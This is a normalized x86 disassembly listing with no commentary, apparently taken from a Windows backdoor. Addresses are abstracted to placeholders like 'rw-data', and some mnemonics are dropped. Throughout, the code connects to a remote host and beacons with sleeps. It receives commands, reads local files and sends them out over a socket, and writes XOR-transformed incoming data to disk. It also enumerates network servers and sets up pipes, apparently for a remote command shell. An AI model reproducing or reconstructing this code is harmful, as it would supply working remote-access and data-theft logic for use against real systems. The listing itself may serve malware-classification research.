movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax rw-data
movsb [ edi ] [ esi ]
add esp 0x18
lea esi [ eax + 0x1 ]
mov [ rw-data ] 0x0
push [ ebp + 0x68 ]
lea eax [ ebp + 0x94 ]
push eax
push esi
call send
test eax eax
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
call closesocket
push edi
jmp r-xdata
push esi
call shutdown
push esi
jmp r-xdata
sub_7100441a
push ebp
lea ebp [ esp - 0x1fa0 ]
mov eax 0x2020
call sub_71006310
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f9c ] eax
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi [ ebp + 0x1fa8 ]
push 0x64
pop ebx
push ebx
call esi
push ebx
mov [ ebp - 0x70 ] eax
call esi
push ebx
mov [ ebp - 0x68 ] eax
call esi
push ebx
push 0x0
push [ ebp - 0x70 ]
mov esi eax
mov [ ebp - 0x7c ] esi
call memset
push ebx
push 0x0
push [ ebp - 0x68 ]
call memset
push ebx
xor ebx ebx
push ebx
push esi
call memset
mov eax edi
add esp 0x30
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
add edi 0x3
push edi
push esi
call [ strncpy@IAT ]
mov eax esi
add esp 0xc
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
test eax eax
jle r-xdata
mov eax esi
lea ecx [ ebx + 0x1 ]
lea edi [ eax + 0x1 ]
mov edx [ ebp - 0x70 ]
mov ecx esi
sub edx esi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
cmp ecx eax
jge r-xdata
mov [ edx + ecx ] al
inc ebx
mov eax esi
mov [ ebp - 0x6c ] ebx
inc ecx
lea edi [ eax + 0x1 ]
call sub_71001e53
mov esi [ CreateFileA@IAT ]
xor eax eax
push eax
mov edi 0x80
push edi
push 0x3
push eax
push eax
push 0x80000000
push [ ebp - 0x70 ]
call esi
xor ebx ebx
cmp eax 0xffffffff
mov [ ebp - 0x6c ] eax
je r-xdata
mov edx [ ebp - 0x68 ]
mov eax ecx
sub eax ebx
lea edi [ eax + edx - 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
mov ebx [ ebp - 0x6c ]
sub eax edi
cmp ebx eax
jl r-xdata
mov edi 0x2000
push ebx
push edi
push 0x2
push ebx
push ebx
push 0x40000000
push [ ebp - 0x68 ]
call esi
mov ecx rw-data
mov [ ebp - 0x74 ] eax
mov eax ecx
lea esi [ eax + 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jl r-xdata
mov al [ ecx ]
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x78 ] ebx
jne r-xdata
mov esi [ ebp - 0x78 ]
cmp esi ebx
jbe r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push ebx
lea edx [ ebp - 0x80 ]
push edx
sub eax esi
push eax
push ecx
push [ ebp - 0x74 ]
call [ WriteFile@IAT ]
mov al [ ecx + esi ]
mov [ edi ] al
mov eax esi
inc ecx
inc edi
lea edx [ eax + 0x1 ]
push edi
lea eax [ ebp - 0x64 ]
push ebx
push eax
call memset
add esp 0xc
push ebx
lea eax [ ebp - 0x78 ]
push eax
push edi
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x6c ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x6c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x74 ]
call esi
push [ ebp - 0x70 ]
mov esi [ free@IAT ]
call esi
push [ ebp - 0x68 ]
call esi
push [ ebp - 0x7c ]
call esi
push edi
push ebx
mov ebx rw-data
push ebx
call memset
push edi
push 0x0
push rw-data
call memset
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
movsw [ edi ] [ esi ]
add esp 0x24
lea esi [ eax + 0x1 ]
push esi
call sub_7100210d
xor eax eax
cmp esi ebx
pop ecx
jle r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
mov esi rw-data
push esi
push ebx
call sub_71003a63
add esp 0xc
push 0x0
push eax
push esi
push [ rw-data ]
mov [ rw-data ] eax
call send
push 0x0
call [ ExitThread@IAT ]
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x74 ]
call [ WriteFile@IAT ]
mov cl [ eax + rw-data ]
xor [ ebp + eax - 0x64 ] cl
inc eax
cmp eax esi
jl r-xdata
sub_71004668
push ebp
lea ebp [ esp - 0x1fa8 ]
mov eax 0x2028
call sub_71006310
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1fa4 ] eax
push ebx
mov ebx [ ebp + 0x1fb0 ]
push esi
mov esi [ malloc@IAT ]
push edi
push 0x64
pop edi
push edi
call esi
push edi
mov [ ebp - 0x6c ] eax
call esi
push edi
mov [ ebp - 0x64 ] eax
call esi
push edi
push 0x0
push [ ebp - 0x6c ]
mov esi eax
mov [ ebp - 0x7c ] esi
call memset
push edi
push 0x0
push [ ebp - 0x64 ]
call memset
push edi
push 0x0
push esi
call memset
mov eax ebx
add esp 0x30
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
add ebx 0x3
push ebx
push esi
call [ strncpy@IAT ]
mov eax esi
add esp 0xc
xor edi edi
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
test eax eax
jle r-xdata
mov eax esi
lea ecx [ edi + 0x1 ]
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x6c ]
mov ecx esi
sub edx esi
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jge r-xdata
inc edi
mov [ edx + ecx ] al
mov eax esi
mov [ ebp - 0x68 ] edi
inc ecx
lea edi [ eax + 0x1 ]
mov esi 0x2000
push esi
xor edi edi
push edi
push rw-data
call memset
push esi
push edi
mov ebx rw-data
push ebx
call memset
add esp 0x18
push edi
push 0x80
push 0x3
push edi
push edi
mov edi [ CreateFileA@IAT ]
push 0x80000000
push [ ebp - 0x6c ]
call edi
cmp eax 0xffffffff
mov [ ebp - 0x74 ] eax
jne r-xdata
mov edx [ ebp - 0x64 ]
mov eax ecx
sub eax edi
lea edi [ eax + edx - 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edi
mov edi [ ebp - 0x68 ]
cmp edi eax
jl r-xdata
xor eax eax
push eax
push 0x80
push 0x2
push eax
push eax
push 0x40000000
push [ ebp - 0x64 ]
call edi
cmp eax 0xffffffff
mov [ ebp - 0x68 ] eax
jne r-xdata
push 0x5
pop ecx
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
mov eax esi
lea edi [ eax + 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jl r-xdata
mov al [ ecx ]
cmp al 0x2d
je r-xdata
push 0xc8
push 0x0
mov edi rw-data
push edi
call memset
add esp 0xc
push 0x0
lea eax [ ebp - 0x70 ]
push eax
push 0x1
lea eax [ ebp - 0x5d ]
push eax
push [ ebp - 0x74 ]
call [ ReadFile@IAT ]
not [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x23
je r-xdata
push 0x6
pop ecx
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
mov esi rw-data
mov eax esi
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push ebx
push esi
call sub_71003a63
add esp 0xc
push 0x0
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jge r-xdata
mov al [ ecx + esi ]
mov [ edi ] al
mov eax esi
inc ecx
inc edi
lea edx [ eax + 0x1 ]
push edi
call [ atoi@IAT ]
pop ecx
push 0x64
pop ecx
mov [ ebp - 0x78 ] edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push ebx
push esi
call sub_71003a63
add esp 0xc
push 0x0
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jl r-xdata
mov ecx [ ebp + 0x1fa4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71006270
add ebp 0x1fa8
leave
retn
push [ rw-data ]
call closesocket
mov edx eax
shr edx 0x6
xor edx eax
shr edx 0x18
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
push 0x64
mov [ rw-data ] eax
pop ecx
mov al [ ebp - 0x5d ]
mov ecx [ ebp - 0x78 ]
inc [ ebp - 0x78 ]
push 0x0
mov [ ecx ] al
lea eax [ ebp - 0x70 ]
push eax
push 0x1
lea eax [ ebp - 0x5d ]
push eax
push [ ebp - 0x74 ]
call [ ReadFile@IAT ]
not [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x23
jne r-xdata
mov esi 0x2000
mov edx eax
shr edx 0xd
xor edx eax
shr edx 0x11
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
mov [ rw-data ] eax
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov edi [ ebp - 0x70 ]
test edi edi
jbe r-xdata
push esi
lea eax [ ebp - 0x5c ]
push 0x0
push eax
call memset
add esp 0xc
push 0x0
lea eax [ ebp - 0x70 ]
push eax
push esi
lea eax [ ebp - 0x5c ]
push eax
push [ ebp - 0x74 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x74 ]
mov edi [ CloseHandle@IAT ]
call edi
push [ ebp - 0x68 ]
call edi
push esi
push 0x0
push rw-data
call memset
push esi
push 0x0
push ebx
call memset
add esp 0x18
push 0x6
pop ecx
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
mov eax esi
lea edi [ eax + 0x1 ]
push edi
call sub_7100210d
xor eax eax
test edi edi
pop ecx
jle r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push ebx
push esi
call sub_71003a63
add esp 0xc
push 0x0
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jl r-xdata
push 0x0
lea eax [ ebp - 0x80 ]
push eax
push edi
lea eax [ ebp - 0x5c ]
push eax
push [ ebp - 0x68 ]
call [ WriteFile@IAT ]
mov cl [ eax + rw-data ]
xor [ ebp + eax - 0x5c ] cl
inc eax
cmp eax edi
jl r-xdata
push [ ebp - 0x6c ]
mov esi [ free@IAT ]
call esi
push [ ebp - 0x64 ]
call esi
push [ ebp - 0x7c ]
call esi
add esp 0xc
push 0x0
call [ ExitThread@IAT ]
sub_71004a19
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
xor ebx ebx
push 0x64
pop edi
push edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] ebx
call esi
push edi
mov [ ebp - 0x10 ] eax
call esi
push edi
mov [ ebp - 0x8 ] eax
call esi
push edi
push ebx
push [ ebp - 0x10 ]
mov esi eax
mov [ ebp - 0x24 ] esi
call memset
push edi
push ebx
push [ ebp - 0x8 ]
call memset
push edi
push ebx
push esi
call memset
mov ecx [ ebp + 0x8 ]
mov eax ecx
add esp 0x30
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
add ecx 0x6
push ecx
push esi
call [ strncpy@IAT ]
mov eax esi
add esp 0xc
xor edi edi
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
je r-xdata
mov eax esi
lea ecx [ edi + 0x1 ]
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x8 ]
mov ecx esi
sub edx esi
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jae r-xdata
inc edi
mov [ edx + ecx ] al
mov eax esi
mov [ ebp + 0x8 ] edi
inc ecx
lea edi [ eax + 0x1 ]
mov esi [ ebp - 0x8 ]
mov cx [ esi ]
mov eax r--data
cmp cx [ eax ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax ecx
sub eax edi
lea edi [ eax + edx - 0x1 ]
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edi
mov edi [ ebp + 0x8 ]
cmp edi eax
jb r-xdata
push 0x3
pop ecx
mov edi r--data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebp - 0x4 ] 0x18
mov bl [ eax ]
inc eax
test bl bl
jne r-xdata
sub eax edx
cmp ecx eax
jb r-xdata
mov al [ ecx ]
cmp al 0x2d
je r-xdata
mov esi [ ebp - 0x8 ]
mov ecx [ esi ]
mov eax r--data
cmp ecx [ eax ]
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov al [ ecx + esi ]
mov [ edi ] al
mov eax esi
inc ecx
inc edi
lea edx [ eax + 0x1 ]
push 0x3
pop ecx
mov edi r--data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebp - 0x4 ] 0x2000000
push r--data
push [ ebp - 0x10 ]
call [ fopen@IAT ]
pop ecx
pop ecx
mov ebx eax
lea eax [ ebp - 0x20 ]
push eax
xor edi edi
push edi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
push 0x65
push edi
call NetServerEnum
cmp eax edi
mov [ ebp - 0x4 ] eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0xc ]
cmp eax edi
je r-xdata
cmp eax 0xea
je r-xdata
push ebx
call [ fclose@IAT ]
push [ ebp - 0x10 ]
mov esi [ free@IAT ]
call esi
push [ ebp - 0x8 ]
call esi
push [ ebp - 0x24 ]
call esi
mov esi 0x2000
push esi
push edi
mov ebx rw-data
push ebx
call memset
push esi
push 0x0
push rw-data
call memset
add esp 0x28
push 0x6
pop ecx
mov esi r--data
mov edi rw-data
mov eax ebx
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
cmp [ ebp - 0x14 ] edi
mov esi [ fprintf@IAT ]
mov [ ebp + 0x8 ] edi
jbe r-xdata
push eax
push r--data
push ebx
call [ fprintf@IAT ]
add esp 0xc
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
mov esi rw-data
push esi
push ebx
call sub_71003a63
add esp 0xc
push 0x0
push eax
push esi
push [ rw-data ]
mov [ rw-data ] eax
call send
push 0x0
call [ ExitThread@IAT ]
cmp [ ebp - 0x4 ] 0xea
jne r-xdata
lea edi [ eax + 0x10 ]
cmp [ ebp - 0xc ] edi
je r-xdata
push [ ebp - 0x18 ]
push r--data
push ebx
call esi
add esp 0xc
xor edi edi
push r--data
push ebx
call esi
push [ ebp - 0x1c ]
push r--data
push ebx
call esi
add esp 0x14
push r--data
push ebx
call [ fwprintf@IAT ]
pop ecx
pop ecx
push r--data
push ebx
call esi
push [ edi - 0xc ]
push r--data
push ebx
call [ fwprintf@IAT ]
push [ edi - 0x4 ]
push [ edi - 0x8 ]
push [ edi - 0x10 ]
push r--data
push ebx
call esi
push r--data
push ebx
call esi
add esp 0x30
test [ edi ] 0x8
je r-xdata
push [ ebp - 0xc ]
call NetApiBufferFree
test [ edi ] 0x10
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x4
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x2000000
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x80
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x4000
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x200
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
push [ edi + 0x4 ]
push r--data
push ebx
call [ fwprintf@IAT ]
add esp 0xc
add edi 0x18
inc [ ebp - 0x18 ]
inc [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
lea eax [ edi - 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
sub_71004d7b
push 0xffffffff
push sub_71006dcc
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2674
call sub_71006310
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2670 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2688 ]
mov [ fs : 0x0 ] eax
mov ebx [ fopen@IAT ]
mov ebp r--data
xor edi edi
push ebp
push r--data
mov [ esp + 0x2c ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] edi
call ebx
mov esi eax
cmp esi edi
pop ecx
pop ecx
je r-xdata
push ebp
push r--data
call ebx
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
call [ fgetc@IAT ]
mov cl al
xor eax eax
lea edi [ esp + 0x3a4 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
movsx eax cl
push eax
lea eax [ esp + 0x3a8 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
lea ecx [ esp + 0x3a8 ]
push ecx
push sub_7100316c
push eax
push eax
call [ CreateThread@IAT ]
push esi
call [ fclose@IAT ]
pop ecx
and [ esp + 0x64 ] 0x0
mov [ esp + 0x6c ] 0x5
mov [ esp + 0x70 ] 0x1f4
mov [ esp + 0x68 ] 0x1
mov [ esp + 0x60 ] 0xc
mov ebp rw-data
mov ebx rw-data
xor eax eax
lea edi [ esp + 0x3b4 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
lea edi [ esp + 0x3a0 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push esi
stosd [ edi ]
lea eax [ esp + 0x3a4 ]
push 0x14
push eax
call [ fgets@IAT ]
lea eax [ esp + 0x3ac ]
push eax
lea eax [ esp + 0x3c4 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x18
lea eax [ esp + 0x1c ]
push eax
xor eax eax
push eax
lea ecx [ esp + 0x3bc ]
push ecx
push sub_71002ded
push eax
push eax
call [ CreateThread@IAT ]
push esi
call [ fclose@IAT ]
pop ecx
call sub_710023d4
test eax eax
mov [ esp + 0x38 ] eax
je r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ esp + 0x2688 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2670 ]
xor ecx esp
call sub_71006270
add esp 0x2680
retn
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x210 ]
push eax
push 0x101
call WSAStartup
test eax eax
je r-xdata
push 0x0
push 0x0
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call sub_71001000
mov [ esp + 0x5c ] r--data
call sub_710028a3
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push 0x32
push 0x0
mov esi rw-data
push esi
mov edi eax
call memset
add esp 0xc
mov eax edi
sub esi edi
push rw-data
call gethostbyname
test eax eax
je r-xdata
call WSACleanup
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
push 0x1d4c0
push 0x0
push 0x1
push 0x2
call socket
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push rw-data
call [ atol@IAT ]
pop ecx
push eax
call htons
push rw-data
mov [ esp + 0x206 ] ax
mov [ esp + 0x204 ] 0x2
call inet_addr
mov [ esp + 0x204 ] eax
push 0x10
lea eax [ esp + 0x204 ]
push eax
push [ rw-data ]
call connect
test eax eax
je r-xdata
jmp r-xdata
mov esi 0x2000
push esi
push 0x0
push ebp
call memset
push esi
push 0x0
push ebx
call memset
mov edi ebp
add esp 0x18
dec edi
push 0x0
call [ _time64@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x28
cdq
pop ecx
idiv ecx
mov esi [ Sleep@IAT ]
imul edx edx 0xea60
push edx
call esi
push rw-data
call gethostbyname
test eax eax
je r-xdata
mov esi [ Sleep@IAT ]
push 0xea60
call esi
push rw-data
call gethostbyname
test eax eax
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsd [ edi ] [ esi ]
push 0x80
lea eax [ esp + 0x408 ]
push eax
movsw [ edi ] [ esi ]
call gethostname
test eax eax
jne r-xdata
push 0x927c0
jmp r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push 0x32
push 0x0
mov esi rw-data
push esi
mov edi eax
call memset
add esp 0xc
mov eax edi
sub esi edi
xor edi edi
lea eax [ esp + 0x404 ]
mov esi eax
call esi
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
xor ecx ecx
inc ecx
add esp 0x18
cmp eax ecx
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebp
sub eax esi
dec edi
push edi
jmp r-xdata
mov eax [ rw-data ]
mov [ esp + 0x100 ] eax
lea eax [ esp + 0x6c ]
push eax
push edi
push edi
lea eax [ esp + 0x108 ]
push eax
push edi
mov [ esp + 0x110 ] ecx
call select
test eax eax
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
dec edi
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
lea eax [ esp + 0xfc ]
push eax
push [ rw-data ]
call __WSAFDIsSet
test eax eax
mov esi rw-data
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ esp + 0x404 ]
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call gethostbyname
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
push [ rw-data ]
push esi
call sub_71003100
pop ecx
pop ecx
mov ecx esi
mov ecx [ ecx ]
mov eax r--data
cmp ecx [ eax ]
je r-xdata
push edi
push 0x2000
push esi
push [ rw-data ]
call recv
cmp eax 0x1
mov [ rw-data ] eax
jl r-xdata
xor edi edi
mov [ esp + 0x18 ] edi
lea eax [ esp + 0x1c ]
push eax
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
push 0x2000
push edi
push esi
call memset
add esp 0xc
push edi
push 0x2000
push esi
push [ rw-data ]
call recv
cmp eax 0x1
mov [ rw-data ] eax
jl r-xdata
mov eax ebp
lea esi [ eax + 0x1 ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
mov esi eax
push edi
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0xea60
jmp r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi ebp
sub eax esi
dec edi
call [ Sleep@IAT ]
jmp r-xdata
push eax
push esi
call sub_71003100
push 0x2000
push edi
push ebp
call memset
push 0x2000
push edi
push ebx
call memset
mov ecx esi
mov ecx [ ecx ]
mov eax r--data
add esp 0x20
cmp ecx [ eax ]
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
dec edi
cmp [ esp + 0x38 ] 0x1
jne r-xdata
push 0x5
mov edx rw-data
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
add [ esp + 0x18 ] 0x4
mov esi r--data
movsw [ edi ] [ esi ]
xor edi edi
jmp r-xdata
push 0x1f4
call [ Sleep@IAT ]
push [ rw-data ]
mov edi [ CloseHandle@IAT ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call closesocket
xor eax eax
lea edi [ esp + 0x3dc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ esi + 0x1 ]
push r--data
call sub_71002873
pop ecx
mov ecx edx
mov ecx [ ecx ]
mov eax r--data
cmp ecx [ eax ]
jne r-xdata
cmp [ esp + 0x24 ] eax
je r-xdata
mov eax [ esp + 0x20 ]
mov eax [ eax + 0xc ]
mov ecx [ esp + 0x18 ]
add eax ecx
cmp [ eax ] edi
je r-xdata
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
sub esi eax
add esi 0xfffffffc
push esi
lea eax [ esp + 0x3e0 ]
push rw-data
push eax
call [ strncpy@IAT ]
lea eax [ esp + 0x3e8 ]
push eax
call [ atof@IAT ]
fmul [ r--data ]
add esp 0x10
call sub_71006376
push eax
jmp r-xdata
push 0x7
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
push 0x44
pop esi
xor edi edi
push esi
lea eax [ esp + 0xbc ]
push edi
push eax
mov [ esp + 0x2c ] edi
call memset
add esp 0xc
lea eax [ esp + 0xb8 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ esp + 0xe8 ] di
mov edi [ malloc@IAT ]
push 0x14
mov [ esp + 0xbc ] esi
mov [ esp + 0xe8 ] 0x101
call edi
push 0x14
mov [ esp + 0x20 ] eax
call edi
push 0x14
mov [ esp + 0x34 ] eax
call edi
push 0x32
mov [ esp + 0x3c ] eax
call edi
push 0x64
mov [ esp + 0x50 ] eax
call edi
mov edi [ esp + 0x2c ]
mov esi eax
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi [ esp + 0x3c ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi [ esp + 0x40 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x32
stosd [ edi ]
push 0x0
push [ esp + 0x58 ]
stosd [ edi ]
call memset
push 0x64
push 0x0
push esi
call memset
mov eax rw-data
add esp 0x2c
lea edi [ eax + 0x1 ]
mov edi [ CreatePipe@IAT ]
xor esi esi
push esi
lea eax [ esp + 0x64 ]
push eax
push rw-data
push rw-data
call edi
test eax eax
jne r-xdata
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebp
movsw [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
push 0x3
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
cmp [ esp + 0x24 ] eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
add eax 0xfffffffc
push eax
push rw-data
push esi
call [ strncpy@IAT ]
add esp 0xc
xor ecx ecx
mov eax esi
mov [ esp + 0x48 ] ecx
lea edi [ eax + 0x1 ]
push esi
lea eax [ esp + 0x64 ]
push eax
push rw-data
push rw-data
call edi
test eax eax
jne r-xdata
push 0x5
pop ecx
mov esi r--data
mov edi rw-data
mov eax ebp
[ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push ebx
push ebp
call sub_71003a63
push eax
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call sub_71002f4a
add esp 0x18
cmp eax 0x1
jge r-xdata
push 0x2
pop ecx
mov edi r--data
mov esi edx
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0x6
pop ecx
mov esi r--data
mov edi rw-data
[ edi ] [ esi ]
mov eax ebp
movsw [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
lea esi [ edx + 0x1 ]
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebp
movsb [ edi ] [ esi ]
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
test eax eax
jle r-xdata
push 0x44
pop edi
push edi
lea eax [ esp + 0x78 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ esp + 0x74 ]
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0xb4 ] eax
mov [ esp + 0xb0 ] eax
lea eax [ esp + 0x3b4 ]
push eax
lea eax [ esp + 0x78 ]
